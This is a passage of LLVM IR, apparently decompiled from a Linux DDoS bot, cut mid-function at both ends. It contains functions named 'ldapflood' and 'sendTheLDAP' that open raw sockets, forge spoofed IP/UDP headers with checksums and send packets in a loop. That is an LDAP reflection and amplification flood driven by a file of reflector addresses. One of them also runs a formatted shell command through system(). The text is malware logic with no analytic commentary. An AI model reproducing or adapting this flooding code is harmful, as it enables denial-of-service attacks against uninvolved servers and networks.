  %v2_804d759 = trunc i32 %v1_804d759 to i16
  %v3_804d766 = add i32 %v4_804d74b, 2
  %v4_804d766 = inttoptr i32 %v3_804d766 to i16*
  store i16 %v2_804d759, i16* %v4_804d766, align 2
  %v1_804d76d = add i32 %v4_804d74b, 6
  %v2_804d76d = inttoptr i32 %v1_804d76d to i16*
  store i16 0, i16* %v2_804d76d, align 2
  %v1_804d776 = add i32 %v4_804d74b, 8
  %v1_804d779 = inttoptr i32 %v1_804d776 to i8*
  store i1 false, i1* @df, align 1
  %v7_804d786 = call i8* @_memcpy(i8* %v1_804d779, i8* bitcast (i8** @global_var_8069620.179 to i8*), i32 51)
  %v8_804d786 = ptrtoint i8* %v7_804d786 to i32
  store i32 %v8_804d786, i32* @ecx, align 4
  %v1_804d78d = call i32 @htons(i32 59)
  %v2_804d78d = trunc i32 %v1_804d78d to i16
  %v4_804d79a = add i32 %v4_804d74b, 4
  %v5_804d79a = inttoptr i32 %v4_804d79a to i16*
  store i16 %v2_804d78d, i16* %v5_804d79a, align 2
  %v2_804d7a1 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d7a1, i32* @esi, align 4
  ret i32 %v4_804d74b

; uselistorder directives
  uselistorder i16* %arg1, { 1, 0 }
}

define i32 @ldapflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4144 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %v2_804d7b4 = ptrtoint i32* %stack_var_-4124 to i32
  %v1_804d7c0 = add i32 %v2_804d7b4, 20
  %v5_804d7c3 = inttoptr i32 %v1_804d7c0 to i16*
  %v1_804d7d2 = add i32 %arg1, 12
  %v2_804d7d2 = inttoptr i32 %v1_804d7d2 to i32*
  %v3_804d7d2 = load i32, i32* %v2_804d7d2, align 4
  %v1_804d7f0 = add i32 %arg1, 4
  %v2_804d7f0 = inttoptr i32 %v1_804d7f0 to i32*
  %v3_804d7f0 = load i32, i32* %v2_804d7f0, align 4
  %v3_804d7ff = call i32 @socket(i32 2, i32 3, i32 6)
  %v5_804d80a = icmp slt i32 %v3_804d7ff, 0
  %v1_804d80e = icmp eq i1 %v5_804d80a, false
  br i1 %v1_804d80e, label %entry.dec_label_pc_804d81a_crit_edge, label %dec_label_pc_804d810

entry.dec_label_pc_804d81a_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804d81a

dec_label_pc_804d810:                             ; preds = %entry
  %v1_804d815 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804d81a

dec_label_pc_804d81a:                             ; preds = %entry.dec_label_pc_804d81a_crit_edge, %dec_label_pc_804d810
  %v2_804d81f = call i32 @__GI_time(i32* null)
  %v1_804d828 = call i32 @init_rand(i32 %v2_804d81f)
  %v3_804d844 = bitcast i32* %stack_var_-4124 to i8*
  %v4_804d844 = call i32 @__GI_memset(i8* %v3_804d844, i32 0, i32 4096)
  store i32 %v4_804d844, i32* @eax, align 4
  %v2_804d852 = call i32 @setup_ldap_ip_header(i8* %v3_804d844)
  %v2_804d860 = call i32 @setup_ldap_udp_header(i16* %v5_804d7c3)
  %v0_804d868 = call i32 @random()
  %v2_804d878 = ashr i32 %v0_804d868, 31
  %v2_804d87b = zext i32 %v0_804d868 to i64
  %v4_804d87b = zext i32 %v2_804d878 to i64
  %v5_804d87b = mul nuw i64 %v4_804d87b, 4294967296
  %v6_804d87b = or i64 %v5_804d87b, %v2_804d87b
  %v10_804d87b = srem i64 %v6_804d87b, 65535
  %v11_804d87b = trunc i64 %v10_804d87b to i32
  %v1_804d87f = add i32 %v11_804d87b, 64510
  %v1_804d884 = urem i32 %v1_804d87f, 65536
  %v1_804d88d = call i32 @htons(i32 %v1_804d884)
  %v2_804d88d = trunc i32 %v1_804d88d to i16
  store i16 %v2_804d88d, i16* %v5_804d7c3, align 4
  %v2_804d8a6 = add i32 %v2_804d7b4, 12
  %v3_804d8a6 = inttoptr i32 %v2_804d8a6 to i32*
  store i32 %v3_804d7d2, i32* %v3_804d8a6, align 4
  %v1_804d8ac = add i32 %v3_804d7f0, 4
  %v2_804d8ac = inttoptr i32 %v1_804d8ac to i32*
  %v3_804d8ac = load i32, i32* %v2_804d8ac, align 4
  %v2_804d8b2 = add i32 %v2_804d7b4, 16
  %v3_804d8b2 = inttoptr i32 %v2_804d8b2 to i32*
  store i32 %v3_804d8ac, i32* %v3_804d8b2, align 4
  %v1_804d8b8 = or i32 %v2_804d7b4, 2
  %v2_804d8b8 = inttoptr i32 %v1_804d8b8 to i16*
  %v3_804d8b8 = load i16, i16* %v2_804d8b8, align 2
  %v3_804d8bc = udiv i16 %v3_804d8b8, 2
  %v9_804d8bc = zext i16 %v3_804d8bc to i32
  %v2_804d8cc = bitcast i32* %stack_var_-4124 to i16*
  %v3_804d8cc = call i32 @csum(i16* %v2_804d8cc, i32 %v9_804d8bc)
  %v4_804d8cc = trunc i32 %v3_804d8cc to i16
  %v3_804d8d9 = add i32 %v2_804d7b4, 10
  %v4_804d8d9 = inttoptr i32 %v3_804d8d9 to i16*
  store i16 %v4_804d8cc, i16* %v4_804d8d9, align 2
  store i32 1, i32* %stack_var_-4144, align 4
  %v2_804d8e7 = ptrtoint i32* %stack_var_-4144 to i32
  %v5_804d8ff = call i32 @__GI_setsockopt(i32 %v3_804d7ff, i32 0, i32 3, i32 %v2_804d8e7, i32 4)
  %v2_804d907 = icmp slt i32 %v5_804d8ff, 0
  %v1_804d909 = icmp eq i1 %v2_804d907, false
  br i1 %v1_804d909, label %dec_label_pc_804d915, label %dec_label_pc_804d90b

dec_label_pc_804d90b:                             ; preds = %dec_label_pc_804d81a
  %v1_804d910 = call i32 @__GI_exit(i32 -1)
  br label %dec_label_pc_804d915

dec_label_pc_804d915:                             ; preds = %dec_label_pc_804d81a, %dec_label_pc_804d90b
  %v2_804d91a = call i32 @__GI_time(i32* null)
  %v1_804d923 = call i32 @init_rand(i32 %v2_804d91a)
  %v3_804d98f = add i32 %v2_804d7b4, 4
  %v4_804d98f = inttoptr i32 %v3_804d98f to i16*
  br label %dec_label_pc_804d935

dec_label_pc_804d935:                             ; preds = %dec_label_pc_804d9ee, %dec_label_pc_804d915
  %stack_var_-16.0 = phi i32 [ %v3_804d7f0, %dec_label_pc_804d915 ], [ %v3_804d964, %dec_label_pc_804d9ee ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804d915 ], [ %v4_804d9ee, %dec_label_pc_804d9ee ]
  %v3_804d93d = load i16, i16* %v2_804d8b8, align 2
  %v4_804d93d = zext i16 %v3_804d93d to i32
  %v6_804d959 = call i32 @sendto(i32 %v3_804d7ff, i32 %v2_804d7b4, i32 %v4_804d93d, i32 0, i32 %stack_var_-16.0, i32 16)
  %v1_804d964 = add i32 %stack_var_-16.0, 532
  %v2_804d964 = inttoptr i32 %v1_804d964 to i32*
  %v3_804d964 = load i32, i32* %v2_804d964, align 4
  %v1_804d970 = add i32 %v3_804d964, 4
  %v2_804d970 = inttoptr i32 %v1_804d970 to i32*
  %v3_804d970 = load i32, i32* %v2_804d970, align 4
  store i32 %v3_804d970, i32* %v3_804d8b2, align 4
  %v1_804d979 = call i32 @rand_cmwc(i32 %v3_804d964)
  %v1_804d982 = call i32 @htonl(i32 %v1_804d979)
  %v2_804d982 = trunc i32 %v1_804d982 to i16
  store i16 %v2_804d982, i16* %v4_804d98f, align 4
  %v3_804d996 = load i16, i16* %v2_804d8b8, align 2
  %v3_804d99a = udiv i16 %v3_804d996, 2
  %v9_804d99a = zext i16 %v3_804d99a to i32
  %v3_804d9aa = call i32 @csum(i16* %v2_804d8cc, i32 %v9_804d99a)
  %v4_804d9aa = trunc i32 %v3_804d9aa to i16
  store i16 %v4_804d9aa, i16* %v4_804d8d9, align 2
  %v0_804d9bb = load i64, i64* @global_var_807d500.88, align 8
  %v1_804d9bb = trunc i64 %v0_804d9bb to i32
  %v1_804d9c0 = add i32 %v1_804d9bb, 1
  %v1_804d9c1 = sext i32 %v1_804d9c0 to i64
  store i64 %v1_804d9c1, i64* @global_var_807d500.88, align 256
  %v0_804d9c6 = load i32, i32* @global_var_807d3c8.89, align 8
  %v6_804d9d1 = icmp ugt i32 %v0_804d9c6, %storemerge
  br i1 %v6_804d9d1, label %dec_label_pc_804d935.dec_label_pc_804d9ee_crit_edge, label %dec_label_pc_804d9d3

dec_label_pc_804d935.dec_label_pc_804d9ee_crit_edge: ; preds = %dec_label_pc_804d935
  br label %dec_label_pc_804d9ee

dec_label_pc_804d9d3:                             ; preds = %dec_label_pc_804d935
  %v0_804d9dd = load i32, i32* @global_var_806ffa8.90, align 8
  %v1_804d9e6 = sext i32 %v0_804d9dd to i64
  %v2_804d9e6 = call i32 @usleep(i64 %v1_804d9e6)
  br label %dec_label_pc_804d9ee

dec_label_pc_804d9ee:                             ; preds = %dec_label_pc_804d935.dec_label_pc_804d9ee_crit_edge, %dec_label_pc_804d9d3
  %stack_var_-4152.0 = phi i32 [ %storemerge, %dec_label_pc_804d935.dec_label_pc_804d9ee_crit_edge ], [ 0, %dec_label_pc_804d9d3 ]
  %v4_804d9ee = add i32 %stack_var_-4152.0, 1
  br label %dec_label_pc_804d935

; uselistorder directives
  uselistorder i32 %v3_804d964, { 1, 2, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_804d7b4, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-4144, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d9ee, { 1, 0 }
  uselistorder label %dec_label_pc_804d915, { 1, 0 }
  uselistorder label %dec_label_pc_804d81a, { 1, 0 }
}

define i32 @sendTheLDAP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1104 = alloca i32, align 4
  %stack_var_-1180 = alloca i32, align 4
  %stack_var_-1148 = alloca i32, align 4
  %v15_804d9ff = ptrtoint i32* %stack_var_-1148 to i32
  store i32 %v15_804d9ff, i32* @eax, align 4
  %v1_804da13 = call i32 @mfork(i32 %arg2)
  store i32 %v1_804da13, i32* %eax.global-to-local, align 4
  %v1_804da1b = icmp eq i32 %v1_804da13, 0
  %v1_804da1d = icmp eq i1 %v1_804da1b, false
  br i1 %v1_804da1d, label %dec_label_pc_804dfee, label %dec_label_pc_804da23

dec_label_pc_804da23:                             ; preds = %entry
  %v3_804da2f = call i32 @socket(i32 2, i32 3, i32 255)
  store i32 %v3_804da2f, i32* %eax.global-to-local, align 4
  %v5_804da3a = icmp slt i32 %v3_804da2f, 0
  %v1_804da3e = icmp eq i1 %v5_804da3a, false
  br i1 %v1_804da3e, label %dec_label_pc_804da4a, label %dec_label_pc_804da40

dec_label_pc_804da40:                             ; preds = %dec_label_pc_804da23
  %v1_804da45 = call i32 @__GI_exit(i32 1)
  store i32 %v1_804da45, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804da4a

dec_label_pc_804da4a:                             ; preds = %dec_label_pc_804da23, %dec_label_pc_804da40
  %v4_804da4a = add i32 %arg3, -5
  %v9_804da4a = sub i32 4, %arg3
  %v10_804da4a = and i32 %v9_804da4a, %arg3
  %v11_804da4a = icmp slt i32 %v10_804da4a, 0
  %v12_804da4a = icmp eq i32 %v4_804da4a, 0
  %v13_804da4a = icmp slt i32 %v4_804da4a, 0
  %v3_804da4e = icmp eq i1 %v13_804da4a, %v11_804da4a
  %v4_804da4e = icmp eq i1 %v12_804da4a, false
  %v5_804da4e = and i1 %v4_804da4e, %v3_804da4e
  br i1 %v5_804da4e, label %dec_label_pc_804da4a.dec_label_pc_804da70_crit_edge, label %dec_label_pc_804da50

dec_label_pc_804da4a.dec_label_pc_804da70_crit_edge: ; preds = %dec_label_pc_804da4a
  br label %dec_label_pc_804da70

dec_label_pc_804da50:                             ; preds = %dec_label_pc_804da4a
  store i32 %arg1, i32* %stack_var_-1180, align 4
  %v3_804da5e = call i32 @Send(i32 %arg1, i32 ptrtoint ([113 x i8]* @global_var_8069654.180 to i32))
  store i32 %v3_804da5e, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-1180, align 4
  %v1_804da6b = call i32 @__GI_exit(i32 1)
  store i32 %v1_804da6b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804da70

dec_label_pc_804da70:                             ; preds = %dec_label_pc_804da4a.dec_label_pc_804da70_crit_edge, %dec_label_pc_804da50
  %v12_804da7a.pre-phi = ptrtoint i32* %stack_var_-1180 to i32
  %v3_804da75 = call i32 @__GI_time(i32* null)
  %v1_804da83 = add i32 %arg4, 24
  store i32 %v1_804da83, i32* %eax.global-to-local, align 4
  %v1_804da86 = inttoptr i32 %v1_804da83 to i32*
  %v2_804da86 = load i32, i32* %v1_804da86, align 4
  %v1_804da8e = add i32 %arg4, 12
  store i32 %v1_804da8e, i32* %eax.global-to-local, align 4
  %v1_804da91 = inttoptr i32 %v1_804da8e to i32*
  %v2_804da91 = load i32, i32* %v1_804da91, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804da9e = and i32 %v2_804da91, -256
  store i32 %v1_804da9e, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804daa1 = inttoptr i32 %v2_804da91 to i8*
  %v3_804daa7 = call i32 @_strlen(i8* %v4_804daa1)
  %v4_804daa7 = mul i32 %v3_804daa7, -1
  %v5_804daa7 = add i32 %v4_804daa7, -2
  store i32 %v5_804daa7, i32* %ecx.global-to-local, align 4
  %v1_804daad = sub i32 0, %v4_804daa7
  store i32 %v1_804daad, i32* %edx.global-to-local, align 4
  %v2_804dab5 = mul i32 %v3_804daa7, 5
  %v1_804dab7 = add i32 %v2_804dab5, 160
  store i32 %v1_804dab7, i32* %eax.global-to-local, align 4
  %v4_804dabf = add i32 %v2_804dab5, -863
  %v9_804dabf = sub i32 862, %v2_804dab5
  %v10_804dabf = and i32 %v9_804dabf, %v1_804dab7
  %v11_804dabf = icmp slt i32 %v10_804dabf, 0
  %v12_804dabf = icmp eq i32 %v4_804dabf, 0
  %v13_804dabf = icmp slt i32 %v4_804dabf, 0
  %v3_804dac6 = icmp eq i1 %v13_804dabf, %v11_804dabf
  %v4_804dac6 = icmp eq i1 %v12_804dabf, false
  %v5_804dac6 = and i1 %v4_804dac6, %v3_804dac6
  br i1 %v5_804dac6, label %dec_label_pc_804dfee, label %dec_label_pc_804dacc

dec_label_pc_804dacc:                             ; preds = %dec_label_pc_804da70
  store i32 %v1_804da8e, i32* %eax.global-to-local, align 4
  %v2_804dad2 = load i32, i32* %v1_804da91, align 4
  store i32 %v2_804dad2, i32* %edx.global-to-local, align 4
  store i32 %v1_804da8e, i32* %eax.global-to-local, align 4
  %v2_804dada = load i32, i32* %v1_804da91, align 4
  store i32 %v2_804dada, i32* %ecx.global-to-local, align 4
  store i32 %v1_804da8e, i32* %eax.global-to-local, align 4
  %v2_804dae2 = load i32, i32* %v1_804da91, align 4
  store i32 %v2_804dae2, i32* @ebx, align 4
  store i32 %v1_804da8e, i32* %eax.global-to-local, align 4
  %v2_804daea = load i32, i32* %v1_804da91, align 4
  store i32 %v2_804daea, i32* @esi, align 4
  store i32 %v1_804da8e, i32* %eax.global-to-local, align 4
  %v2_804daf2 = load i32, i32* %v1_804da91, align 4
  store i32 %v1_804dab7, i32* @edi, align 4
  %v2_804db02 = ptrtoint i32* %stack_var_-1104 to i32
  store i32 %v2_804db02, i32* %eax.global-to-local, align 4
  %v9_804db09 = call i32 @__GI_snprintf(i32 %v2_804db02, i32 %v1_804dab7, i32 ptrtoint ([176 x i8]* @global_var_80696c8.181 to i32), i32 %v2_804daf2, i32 %v2_804daea, i32 %v2_804dae2, i32 %v2_804dada)
  store i32 %v2_804db02, i32* %eax.global-to-local, align 4
  %v2_804db1b = call i32 @system(i32 %v2_804db02)
  store i32 %v2_804db1b, i32* %eax.global-to-local, align 4
  %v3_804db28 = call i32 @__GI_time(i32* null)
  store i32 %v3_804db28, i32* %eax.global-to-local, align 4
  %v2_804db34 = call i32 @srand(i32 %v3_804db28)
  store i32 0, i32* @global_var_807e520.80, align 32
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_804db5b = call i32 @malloc(i32 128)
  store i32 %v2_804db5b, i32* %edx.global-to-local, align 4
  %v1_804db6c = inttoptr i32 %v2_804db5b to i8*
  store i32 %v2_804db5b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 128, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804db73 = call i8* @_memset(i8* %v1_804db6c, i32 0, i32 128)
  %v6_804db73 = ptrtoint i8* %v5_804db73 to i32
  store i32 %v6_804db73, i32* %ecx.global-to-local, align 4
  %v0_804db75 = load i32, i32* %edx.global-to-local, align 4
  %v1_804db7d = add i32 %arg4, 16
  store i32 %v1_804db7d, i32* %eax.global-to-local, align 4
  %v1_804db80 = inttoptr i32 %v1_804db7d to i32*
  %v2_804db80 = load i32, i32* %v1_804db80, align 4
  store i32 %v2_804db80, i32* %eax.global-to-local, align 4
  %v2_804db86 = call i32 @atol(i32 %v2_804db80)
  %v1_804db94 = add i32 %arg4, 20
  store i32 %v1_804db94, i32* %eax.global-to-local, align 4
  %v1_804db97 = inttoptr i32 %v1_804db94 to i32*
  %v2_804db97 = load i32, i32* %v1_804db97, align 4
  store i32 %v2_804db97, i32* %eax.global-to-local, align 4
  %v2_804db9d = call i32 @atol(i32 %v2_804db97)
  store i32 %v2_804db9d, i32* @eax, align 4
  store i32 0, i32* @global_var_807d3c8.89, align 8
  store i64 0, i64* @global_var_807d500.88, align 256
  %v3_804dbd0 = call i32 @__GI_fopen(i32 ptrtoint ([9 x i8]* @global_var_8069778.182 to i32), i32 ptrtoint ([2 x i8]* @global_var_8068ea3.83 to i32))
  store i32 %v3_804dbd0, i32* %eax.global-to-local, align 4
  %v8_804dd52 = inttoptr i32 %v0_804db75 to i8*
  %v1_804dbee = and i32 %v0_804db75, -256
  %v5_804dc52 = add i32 %v0_804db75, -1
  br label %dec_label_pc_804dd49.outer

dec_label_pc_804dbe0:                             ; preds = %dec_label_pc_804dd49
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804dbee, i32* %eax.global-to-local, align 4
  %v3_804dbf7 = call i32 @_strlen(i8* %v8_804dd52)
  %v4_804dbf7 = mul i32 %v3_804dbf7, -1
  %v5_804dbf7 = add i32 %v4_804dbf7, -2
  store i32 %v5_804dbf7, i32* %ecx.global-to-local, align 4
  %v5_804dbfe = sub i32 %v0_804db75, %v4_804dbf7
  %v1_804dc01 = add i32 %v5_804dbfe, -1
  store i32 %v1_804dc01, i32* %eax.global-to-local, align 4
  %v1_804dc02 = inttoptr i32 %v1_804dc01 to i8*
  %v2_804dc02 = load i8, i8* %v1_804dc02, align 1
  %v3_804dc02 = zext i8 %v2_804dc02 to i32
  %v5_804dc02 = and i32 %v1_804dc01, -256
  %v6_804dc02 = or i32 %v3_804dc02, %v5_804dc02
  store i32 %v6_804dc02, i32* %eax.global-to-local, align 4
  %v10_804dc04 = icmp eq i8 %v2_804dc02, 10
  br i1 %v10_804dc04, label %dec_label_pc_804dc34, label %dec_label_pc_804dc08

dec_label_pc_804dc08:                             ; preds = %dec_label_pc_804dbe0
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v1_804dbee, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804db75, i32* @edi, align 4
  %v3_804dc1f = call i32 @_strlen(i8* %v8_804dd52)
  %v4_804dc1f = mul i32 %v3_804dc1f, -1
  %v5_804dc1f = add i32 %v4_804dc1f, -2
  store i32 %v5_804dc1f, i32* @ecx, align 4
  %v5_804dc26 = sub i32 %v0_804db75, %v4_804dc1f
  %v1_804dc29 = add i32 %v5_804dc26, -1
  store i32 %v1_804dc29, i32* %eax.global-to-local, align 4
  %v1_804dc2a = inttoptr i32 %v1_804dc29 to i8*
  %v2_804dc2a = load i8, i8* %v1_804dc2a, align 1
  %v3_804dc2a = zext i8 %v2_804dc2a to i32
  %v5_804dc2a = and i32 %v1_804dc29, -256
  %v6_804dc2a = or i32 %v3_804dc2a, %v5_804dc2a
  store i32 %v6_804dc2a, i32* %eax.global-to-local, align 4
  %v10_804dc2c = icmp eq i8 %v2_804dc2a, 13
  %v1_804dc2e = icmp eq i1 %v10_804dc2c, false
  br i1 %v1_804dc2e, label %dec_label_pc_804dd49, label %dec_label_pc_804dc34

dec_label_pc_804dc34:                             ; preds = %dec_label_pc_804dc08, %dec_label_pc_804dbe0
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %v0_804db75, i32* %stack_var_-1148, align 4
  store i32 %v1_804dbee, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v0_804db75, i32* @edi, align 4
  %v3_804dc4b = call i32 @_strlen(i8* %v8_804dd52)
  %v4_804dc4b = mul i32 %v3_804dc4b, -1
  %v5_804dc4b = add i32 %v4_804dc4b, -2
  store i32 %v5_804dc4b, i32* @ecx, align 4
  %v1_804dc55 = sub i32 %v5_804dc52, %v4_804dc4b
  %v1_804dc56 = inttoptr i32 %v1_804dc55 to i8*
  store i8 0, i8* %v1_804dc56, align 1
  %v0_804dc59 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804dc59, i32* %eax.global-to-local, align 4
  %v1_804dc5e = icmp eq i32 %v0_804dc59, 0
  %v1_804dc60 = icmp eq i1 %v1_804dc5e, false
  %v2_804dcda = call i32 @malloc(i32 540)
  store i32 %v2_804dcda, i32* %eax.global-to-local, align 4
  br i1 %v1_804dc60, label %dec_label_pc_804dcd2, label %dec_label_pc_804dc62

dec_label_pc_804dc62:                             ; preds = %dec_label_pc_804dc34
  store i32 %v2_804dcda, i32* @global_var_807e520.80, align 32
  store i32 %v2_804dcda, i32* %eax.global-to-local, align 4
  %v1_804dc7c = inttoptr i32 %v2_804dcda to i32*
  store i32 0, i32* %v1_804dc7c, align 4
  %v0_804dc82 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc82 = add i32 %v0_804dc82, 4
  %v2_804dc82 = inttoptr i32 %v1_804dc82 to i32*
  store i32 0, i32* %v2_804dc82, align 4
  %v0_804dc89 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc89 = add i32 %v0_804dc89, 8
  %v2_804dc89 = inttoptr i32 %v1_804dc89 to i32*
  store i32 0, i32* %v2_804dc89, align 4
  %v0_804dc90 = load i32, i32* %eax.global-to-local, align 4
  %v1_804dc90 = add i32 %v0_804dc90, 12
  %v2_804dc90 = inttoptr i32 %v1_804dc90 to i32*
  store i32 0, i32* %v2_804dc90, align 4
  %v0_804dc97 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804dc97, i32* @ebx, align 4
  %v2_804dca3 = call i32 @inet_addr(i32 %v0_804db75)
  %v1_804dcab = load i32, i32* @ebx, align 4
  %v2_804dcab = add i32 %v1_804dcab, 4
  %v3_804dcab = inttoptr i32 %v2_804dcab to i32*
  store i32 %v2_804dca3, i32* %v3_804dcab, align 4
  %v0_804dcae = load i32, i32* @global_var_807e520.80, align 32
  %v2_804dcb9 = add i32 %v0_804dcae, 532
  %v3_804dcb9 = inttoptr i32 %v2_804dcb9 to i32*
  store i32 %v0_804dcae, i32* %v3_804dcb9, align 4
  %v0_804dcbf = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804dcbf, i32* @edx, align 4
  store i32 %v0_804dcbf, i32* %eax.global-to-local, align 4
  %v2_804dcca = add i32 %v0_804dcbf, 536
  %v3_804dcca = inttoptr i32 %v2_804dcca to i32*
  store i32 %v0_804dcbf, i32* %v3_804dcca, align 4
  br label %dec_label_pc_804dd46

dec_label_pc_804dcd2:                             ; preds = %dec_label_pc_804dc34
  store i32 %v2_804dcda, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v5_804dcf5 = inttoptr i32 %v2_804dcda to i8*
  %v5_804dcf6 = call i32 @__GI_memset(i8* %v5_804dcf5, i32 0, i32 540)
  store i32 %v5_804dcf6, i32* %eax.global-to-local, align 4
  %v2_804dd04 = call i32 @inet_addr(i32 %v0_804db75)
  %v2_804dd11 = add i32 %v2_804dcda, 4
  %v3_804dd11 = inttoptr i32 %v2_804dd11 to i32*
  store i32 %v2_804dd04, i32* %v3_804dd11, align 4
  %v0_804dd14 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804dd14, i32* %edx.global-to-local, align 4
  %v2_804dd1d = add i32 %v2_804dcda, 536
  %v3_804dd1d = inttoptr i32 %v2_804dd1d to i32*
  store i32 %v0_804dd14, i32* %v3_804dd1d, align 4
  %v0_804dd23 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804dd23, i32* %eax.global-to-local, align 4
  %v1_804dd28 = add i32 %v0_804dd23, 532
  %v2_804dd28 = inttoptr i32 %v1_804dd28 to i32*
  %v3_804dd28 = load i32, i32* %v2_804dd28, align 4
  %v2_804dd31 = add i32 %v2_804dcda, 532
  %v3_804dd31 = inttoptr i32 %v2_804dd31 to i32*
  store i32 %v3_804dd28, i32* %v3_804dd31, align 4
  %v0_804dd37 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804dd37, i32* @edx, align 4
  store i32 %v2_804dcda, i32* %eax.global-to-local, align 4
  %v2_804dd40 = add i32 %v0_804dd37, 532
  %v3_804dd40 = inttoptr i32 %v2_804dd40 to i32*
  store i32 %v2_804dcda, i32* %v3_804dd40, align 4
  br label %dec_label_pc_804dd46

dec_label_pc_804dd46:                             ; preds = %dec_label_pc_804dc62, %dec_label_pc_804dcd2
  br label %dec_label_pc_804dd49.outer

dec_label_pc_804dd49.outer:                       ; preds = %dec_label_pc_804dd46, %dec_label_pc_804dacc
  br label %dec_label_pc_804dd49

dec_label_pc_804dd49:                             ; preds = %dec_label_pc_804dd49.outer, %dec_label_pc_804dc08
  %v4_804dd55 = call i32 @fgets(i32 %v0_804db75, i32 128, i32 %v3_804dbd0)
  store i32 %v4_804dd55, i32* %eax.global-to-local, align 4
  %v1_804dd5d = icmp eq i32 %v4_804dd55, 0
  %v1_804dd5f = icmp eq i1 %v1_804dd5d, false
  br i1 %v1_804dd5f, label %dec_label_pc_804dbe0, label %dec_label_pc_804dd65

dec_label_pc_804dd65:                             ; preds = %dec_label_pc_804dd49
  %v0_804dd65 = load i32, i32* @global_var_807e520.80, align 32
  store i32 %v0_804dd65, i32* %eax.global-to-local, align 4
  %v1_804dd6a = add i32 %v0_804dd65, 532
  %v2_804dd6a = inttoptr i32 %v1_804dd6a to i32*
  %v3_804dd6a = load i32, i32* %v2_804dd6a, align 4
  %v2_804dd76 = mul i32 %v2_804db86, 4
  %v1_804dd7c = add i32 %v2_804dd76, 30
  %v2_804dd7f = and i32 %v1_804dd7c, -16
  %v2_804dd85 = sub i32 %v12_804da7a.pre-phi, %v2_804dd7f
  %v1_804dd93 = add i32 %v2_804dd85, 15
  %v2_804dd96 = and i32 %v1_804dd93, -16
  %v1_804ddb7 = add i32 %arg4, 4
  store i32 %v1_804ddb7, i32* %eax.global-to-local, align 4
  %v1_804ddba = inttoptr i32 %v1_804ddb7 to i32*
  %v2_804ddba = load i32, i32* %v1_804ddba, align 4
  store i32 %v2_804ddba, i32* %eax.global-to-local, align 4
  %v2_804ddbf = add i32 %v2_804dd85, -16
  %v3_804ddbf = inttoptr i32 %v2_804ddbf to i32*
  store i32 %v2_804ddba, i32* %v3_804ddbf, align 4
  %v1_804ddc0 = call i32 @inet_addr(i32 %v2_804dd96)
  %v0_804ddc5 = load i32, i32* @esp, align 4
  %v1_804ddc5 = add i32 %v0_804ddc5, 16
  store i32 %v2_804db86, i32* %edx.global-to-local, align 4
  %v2_804ddd9 = mul i32 %v2_804db86, 24
  %v1_804dddf = add i32 %v2_804ddd9, 30
  %v2_804dde2 = and i32 %v1_804dddf, -16
  %v2_804dde8 = sub i32 %v1_804ddc5, %v2_804dde2
  %v1_804ddf6 = add i32 %v2_804dde8, 15
  %v2_804ddf9 = and i32 %v1_804ddf6, -16
  store i32 %v2_804ddf9, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804debe68 = icmp sgt i32 %v2_804db86, 0
  br i1 %v5_804debe68, label %dec_label_pc_804de1a.lr.ph, label %dec_label_pc_804dec4

dec_label_pc_804de1a.lr.ph:                       ; preds = %dec_label_pc_804dd65
  %v3_804de4c = or i32 %v2_804ddf9, 8
  br label %dec_label_pc_804de1a

dec_label_pc_804de1a:                             ; preds = %dec_label_pc_804de1a, %dec_label_pc_804de1a.lr.ph
  %storemerge69 = phi i32 [ 0, %dec_label_pc_804de1a.lr.ph ], [ %v4_804deb5, %dec_label_pc_804de1a ]
  %v1_804de26 = mul i32 %storemerge69, 24
  %v3_804de30 = add i32 %v1_804de26, %v2_804ddf9
  %v4_804de30 = inttoptr i32 %v3_804de30 to i32*
  store i32 %storemerge69, i32* %v4_804de30, align 8
  store i32 %v2_804ddf9, i32* %ecx.global-to-local, align 4
  store i32 %v1_804de26, i32* %edx.global-to-local, align 4
  %v4_804de4c = add i32 %v3_804de4c, %v1_804de26
  %v5_804de4c = inttoptr i32 %v4_804de4c to i32*
  store i32 2, i32* %v5_804de4c, align 8
  %v1_804de56 = load i32, i32* %edx.global-to-local, align 4
  %v2_804de56 = load i32, i32* %ecx.global-to-local, align 4
  %v3_804de56 = add i32 %v1_804de56, 12
  %v4_804de56 = add i32 %v3_804de56, %v2_804de56
  %v5_804de56 = inttoptr i32 %v4_804de56 to i32*
